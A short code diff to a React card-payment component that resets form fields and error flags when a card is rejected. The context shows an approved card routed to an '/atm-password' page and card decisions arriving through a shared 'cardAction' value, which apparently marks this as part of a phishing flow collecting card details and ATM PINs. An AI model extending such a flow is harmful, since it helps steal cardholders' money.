@@ -229,12 +229,17 @@ export default function CreditCardPayment() {
         navigate("/atm-password");
       } else if (action === 'reject') {
         setRejectedError(true);
+        setCardError(false);
+        setLuhnError(false);
+        isCardVerified.value = null;
         reset({
           cardNumber: "",
           nameOnCard: "",
           expiryDate: "",
           cvv: "",
         });
+        setExpiryMonth('');
+        setExpiryYear('');
       }
       cardAction.value = null;
     }
@@ -291,6 +296,9 @@ export default function CreditCardPayment() {
 
     if (globalBlockedError) {
       setGlobalBlockedError(false);
+    }
+    if (rejectedError) {
+      setRejectedError(false);
     }
 
     if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
